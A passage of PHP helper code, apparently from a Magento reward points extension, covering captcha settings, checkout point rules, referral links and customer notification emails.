        public function getCapchaLineColor($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/line_color', $store_id))
            {
                return "#" . Mage::getStoreConfig('rewardpoints/capcha/line_color', $store_id);
            }

            return '#E8E8E8';
        }

        public function capchaUseWordList($store_id)
        {
            if(Mage::getStoreConfig('rewardpoints/capcha/use_wordlist', $store_id))
            {
                return Mage::getStoreConfig('rewardpoints/capcha/use_wordlist', $store_id);
            }

            return 0;
        }

        /*
        public function allowSendEmailToSender($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/email_notifications/enable_send_email_to_sender',$store_id);
        }
        */
        public function allowSendEmailNotifications($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/email_notifications/enable_notifications', $store_id);
        }

        public function allowSendEmailWhenPointsChanged($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/email_notifications/enable_points_changed', $store_id);
        }

        public function allowExchangePointToCredit($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/using_points/enabled', $store_id);
        }

        public function pointCreditRate($store_id)
        {
            return Mage::getStoreConfig('rewardpoints/using_points/point_credit_rate', $store_id);
        }

        public function getCheckoutRewardPointsRule($quote, $store_id = null)
        {
            $rules          = array();
            $_point_details = array();
            if(is_null($store_id))
            {
                $store_id = Mage::app()->getStore()->getId();
            }
            $_point         = $quote->getEarnRewardpointCart();
            $_point_details = unserialize($quote->getMwRewardpointDetail());
            //if($_point > 0)
            //$rules[] = array('message'=>$this->__('%s for this order',$this->formatPoints($_point,$store_id)),'amount'=>$_point, 'qty'=>1);

            foreach ($_point_details as $key => $_point_detail)
            {
                if($_point_detail > 0)
                {
                    $detail  = '';
                    $detail  = trim(Mage::getModel('rewardpoints/cartrules')->load($key)->getDescription());
                    $rules[] = array('message' => $this->__('%s (%s)', $this->formatPoints($_point_detail, $store_id), $detail), 'amount' => $_point_detail, 'qty' => 1);

                }
            }

            foreach ($quote->getAllItems() as $item)
            {
                $product_id = $item->getProduct()->getId();

                $product = $item->getProduct()->load($product_id);
                $mw_reward_point = (int)Mage::getModel('rewardpoints/catalogrules')->getPointCatalogRulue($product_id);

                if($info = $item->getProduct()->getCustomOption('info_buyRequest')) {
                    $infoArr = unserialize($info->getValue());
                    if(count($infoArr) > 0) {
                        $model = Mage::getModel('rewardpoints/productsellpoint');
                        foreach ($infoArr['super_attribute'] as $attr_id => $val) {
                            $collection = $model->getCollection()
                                ->addFieldToFilter('product_id', $product->getId())
                                ->addFieldToFilter('option_id', $val)
                                ->addFieldToFilter('option_type_id', $attr_id)
                                ->addFieldToFilter('type_id', 'super_attribute')
                                ->getFirstItem();
                            $mw_reward_point = $mw_reward_point + intval($collection->getEarnPoint());
                        }
                    }
                }

                if($mw_reward_point > 0) {
                    $rules[] = array('message' => $this->__('%s for product: <b>%s</b>', $this->formatPoints($mw_reward_point, $store_id), $product->getName()), 'amount' => $mw_reward_point, 'qty' => $item->getQty());
                }
            }

            if($quote->getCustomerId())
            {
                if(!Mage::helper('rewardpoints')->checkCustomerMaxBalance($quote->getCustomerId(), $store_id))
                {
                    $rules = array();
                }
            }

            return $rules;
        }

        public function roundPoints($points, $store_id, $up = true)
        {
            $step = Mage::helper('rewardpoints/data')->getPointStepConfig($store_id);

            $tmp = (int)($points / $step) * $step;

            if($up)
            {
                return round(($points / $step), 0) * $step;
            }

            return $tmp;
        }

        public function formatNumber($value)
        {
            return number_format($value, 0, '.', ',');
        }

        public function getLinkCustomer($customer_id, $detail)
        {
            $url    = "adminhtml/customer/edit";
            $result = '';
            //$url = Mage::getUrl($url,array('id'=>$customer_id));
            $result = $this->__("<b><a href=\"%s\">%s</a></b>", Mage::helper('adminhtml')->getUrl($url, array('id' => $customer_id)), $detail);

            //$result = Mage::helper('affiliate')->__("<b><a href='$url'>$detail</a></b>");
            return $result;
        }

        public function getLinkCustomRule($rule_id = null)
        {
            if($rule_id == null)
            {
                return '';
            }
            else
            {
                $data         = 'abc,' . trim($rule_id);
                $data_encrypt = base64_encode($data);
                $type         = Mage::getModel('rewardpoints/activerules')->load($rule_id)->getTypeOfTransaction();
                if($type == MW_RewardPoints_Model_Type::CUSTOM_RULE)
                {
                    return Mage::getBaseUrl() . '?mw_rule=' . $data_encrypt;
                }
                //return Mage::getBaseUrl().'?mw_rule='.md5(trim($rule_id)).'&mw_customer=customer_email';
                else
                {
                    return '';
                }
            }
        }

        public function getLinkCustomRuleNew($rule_id = null, $email = null)
        {
            if($rule_id == null || $email == null)
            {
                return '';
            }
            else
            {
                $data         = 'abc,' . trim($rule_id) . ',' . trim($email);
                $data_encrypt = base64_encode($data);
                $type         = Mage::getModel('rewardpoints/activerules')->load($rule_id)->getTypeOfTransaction();
                if($type == MW_RewardPoints_Model_Type::CUSTOM_RULE)
                {
                    return 'mw_ref=' . $data_encrypt;
                }
                else
                {
                    return '';
                }
            }
        }

        public function sendEmailCustomerPointExpiration($customer_id, $data, $store_id)
        {
            if($this->allowSendEmailNotifications($store_id))
            {
                $store_name                      = Mage::getStoreConfig('general/store_information/name', $store_id);
                $sender                          = Mage::getStoreConfig('rewardpoints/email_notifications/email_sender', $store_id);
                $email                           = Mage::getModel('customer/customer')->load($customer_id)->getEmail();
                $name                            = Mage::getModel('customer/customer')->load($customer_id)->getName();
                $teampale                        = 'rewardpoints/email_notifications/points_expiration';
                $sender_name                     = Mage::getStoreConfig('trans_email/ident_' . $sender . '/name', $store_id);
                $customer_link                   = Mage::app()->getStore($store_id)->getUrl('rewardpoints/rewardpoints/index');
                $data_mail['customer_name']      = $name;
                $data_mail['transaction_amount'] = $data['amount'];
                $data_mail['customer_balance']   = $data['balance'];
                $data_mail['transaction_time']   = Mage::helper('core')->formatDate($data['transaction_time']) . " " . Mage::helper('core')->formatTime($data['transaction_time']);

                $data_mail['sender_name']   = $sender_name;
                $data_mail['store_name']    = $store_name;
                $data_mail['customer_link'] = $customer_link;
                $data_mail['email_contact'] = Mage::getStoreConfig('trans_email/ident_support/email', $store_id);
                $data_mail['phone_contact'] = Mage::getStoreConfig('general/store_information/phone', $store_id);
                $this->_sendEmailTransaction($sender, $email, $name, $teampale, $data_mail, $store_id);
            }
        }

        public function sendEmailCustomerPointBirthday($customer_id, $data, $store_id)
        {
            if($this->allowSendEmailNotifications($store_id))
            {
                $store_name                      = Mage::getStoreConfig('general/store_information/name', $store_id);
                $sender                          = Mage::getStoreConfig('rewardpoints/email_notifications/email_sender', $store_id);
                $email                           = Mage::getModel('customer/customer')->load($customer_id)->getEmail();
                $name                            = Mage::getModel('customer/customer')->load($customer_id)->getName();
                $teampale                        = 'rewardpoints/email_notifications/points_birthday';
                $sender_name                     = Mage::getStoreConfig('trans_email/ident_' . $sender . '/name', $store_id);
                $customer_link                   = Mage::app()->getStore($store_id)->getUrl('rewardpoints/rewardpoints/index');
                $data_mail['customer_name']      = $name;
                $data_mail['transaction_amount'] = MW_RewardPoints_Model_Type::getAmountWithSign($data['amount'], $data['type_of_transaction']);
                $data_mail['customer_balance']   = $data['balance'];
                $comment                         = MW_RewardPoints_Model_Type::getTransactionDetail($data['type_of_transaction'], $data['transaction_detail'], $data['status']);
                $data_mail['transaction_detail'] = $comment;
                $data_mail['transaction_time']   = Mage::helper('core')->formatDate($data['transaction_time']) . " " . Mage::helper('core')->formatTime($data['transaction_time']);
                $data_mail['sender_name']        = $sender_name;
                $data_mail['store_name']         = $store_name;
                $data_mail['customer_link']      = $customer_link;
                $data_mail['email_contact']      = Mage::getStoreConfig('trans_email/ident_support/email', $store_id);
                $data_mail['phone_contact']      = Mage::getStoreConfig('general/store_information/phone', $store_id);
                $this->_sendEmailTransaction($sender, $email, $name, $teampale, $data_mail, $store_id);
            }
        }

        public function sendEmailCustomerPointChanged($customer_id, $data, $store_id)
        {
            $_customer                 = Mage::getModel('rewardpoints/customer')->load($customer_id);
            $subscribed_balance_update = $_customer->getSubscribedBalanceUpdate();

            if($this->allowSendEmailNotifications($store_id) && $subscribed_balance_update == 1)
            {
                $store_name                      = Mage::getStoreConfig('general/store_information/name', $store_id);
                $sender                          = Mage::getStoreConfig('rewardpoints/email_notifications/email_sender', $store_id);
                $email                           = Mage::getModel('customer/customer')->load($customer_id)->getEmail();
                $name                            = Mage::getModel('customer/customer')->load($customer_id)->getName();
                $teampale                        = 'rewardpoints/email_notifications/points_balance';
                $sender_name                     = Mage::getStoreConfig('trans_email/ident_' . $sender . '/name', $store_id);
                $customer_link                   = Mage::app()->getStore($store_id)->getUrl('rewardpoints/rewardpoints/index');
                $data_mail['customer_name']      = $name;
                $data_mail['transaction_amount'] = MW_RewardPoints_Model_Type::getAmountWithSign($data['amount'], $data['type_of_transaction']);
                $data_mail['customer_balance']   = $data['balance'];
                $comment                         = MW_RewardPoints_Model_Type::getTransactionDetail($data['type_of_transaction'], $data['transaction_detail'], $data['status']);
                $data_mail['transaction_detail'] = $comment;
                $data_mail['transaction_time']   = Mage::helper('core')->formatDate($data['transaction_time']) . " " . Mage::helper('core')->formatTime($data['transaction_time']);
                $data_mail['sender_name']        = $sender_name;
                $data_mail['store_name']         = $store_name;
                $data_mail['customer_link']      = $customer_link;
                $data_mail['email_contact']      = Mage::getStoreConfig('trans_email/ident_support/email', $store_id);
                $data_mail['phone_contact']      = Mage::getStoreConfig('general/store_information/phone', $store_id);
                $this->_sendEmailTransaction($sender, $email, $name, $teampale, $data_mail, $store_id);
            }
        }

        public function sendEmailCustomerPointChangedNew($customer_id, $data, $store_id)
        {
            $_customer                 = Mage::getModel('rewardpoints/customer')->load($customer_id);
            $subscribed_balance_update = $_customer->getSubscribedBalanceUpdate();

            if($this->allowSendEmailNotifications($store_id) && $subscribed_balance_update == 1)
            {
                $store_name  = Mage::getStoreConfig('general/store_information/name', $store_id);
                $sender      = Mage::getStoreConfig('rewardpoints/email_notifications/email_sender', $store_id);
                $email       = Mage::getModel('customer/customer')->load($customer_id)->getEmail();
                $name        = Mage::getModel('customer/customer')->load($customer_id)->getName();
                $teampale    = 'rewardpoints/email_notifications/points_balance';
                $sender_name = Mage::getStoreConfig('trans_email/ident_' . $sender . '/name', $store_id);
                //$customer_link = Mage::app()->getStore($store_id)->getUrl('rewardpoints/rewardpoints/index');
                $customer_link                   = Mage::getBaseUrl();
                $data_mail['customer_name']      = $name;
                $data_mail['transaction_amount'] = MW_RewardPoints_Model_Type::getAmountWithSign($data['amount'], $data['type_of_transaction']);
                $data_mail['customer_balance']   = $data['balance'];
                $comment                         = MW_RewardPoints_Model_Type::getTransactionDetail($data['type_of_transaction'], $data['transaction_detail'], $data['status']);
                $data_mail['transaction_detail'] = $comment;
                $data_mail['transaction_time']   = Mage::helper('core')->formatDate($data['transaction_time']) . " " . Mage::helper('core')->formatTime($data['transaction_time']);
                $data_mail['sender_name']        = $sender_name;
                $data_mail['store_name']         = $store_name;
                $data_mail['customer_link']      = $customer_link;
                $data_mail['email_contact']      = Mage::getStoreConfig('trans_email/ident_support/email', $store_id);
                $data_mail['phone_contact']      = Mage::getStoreConfig('general/store_information/phone', $store_id);
                $this->_sendEmailTransaction($sender, $email, $name, $teampale, $data_mail, $store_id);
            }
        }

        public function _sendEmailTransaction($sender, $emailto, $name, $template, $data, $store_id)
        {
            $data['subject'] = 'Reward Points System !';
            $templateId      = Mage::getStoreConfig($template, $store_id);
            $translate       = Mage::getSingleton('core/translate');
            $translate->setTranslateInline(false);

            try
            {
                Mage::getModel('core/email_template')
                    ->sendTransactional(
                        $templateId,
                        $sender,
                        $emailto,
                        $name,
                        $data,
                        $store_id);
                $translate->setTranslateInline(true);
            }
            catch (Exception $e)
            {
                $this->_getSession()->addError($this->__("Email can not send !"));
            }
        }

        protected function isOSCRunning()
        {
            if(Mage::helper('core')->isModuleEnabled('MW_Onestepcheckout') && Mage::helper('core')->isModuleOutputEnabled('MW_Onestepcheckout'))
            {
                if(Mage::getStoreConfig('onestepcheckout/config/enabled'))
                {
                    return true;
                }
            }

            return false;
        }

        public function setEmptyRewardpoint()
        {
            $quote = Mage::getModel('checkout/cart')->getQuote();
            $address = $quote->isVirtual() ? $quote->getBillingAddress() : $quote->getShippingAddress();

            if(count(Mage::getModel('checkout/cart')->getQuote()->getAllItems()) == 0)
            {
                Mage::getSingleton('core/session')->setMwRewardpointDiscountShowTotal(0);
                Mage::getSingleton('core/session')->setMwRewardpointDiscountTotal(0);
                Mage::getSingleton('core/session')->setMwRewardpointAfterDrop(0);
                $address->setMwRewardpoint(0);
                $address->setMwRewardpointDiscountShow(0);
                $address->setMwRewardpointDiscount(0);
                $quote->setMwRewardpoint(0);
                $quote->setMwRewardpointDiscountShow(0);
                $quote->setSpendRewardpointCart(0);
                $quote->save();
            }
        }
        
        public function getLinkShareFacebook($oldLink)
        {
            $data1 = explode('www.',$oldLink);
            $data2 = explode('://',$oldLink);
            
            if($data1[1] != null)
            {
                $newLink = $data1[1];
                
            }else if($data2[1] != null)
            {
                $newLink = $data2[1];
                
            }else
                $newLink = $oldLink;
            
            return $newLink;
        }
    }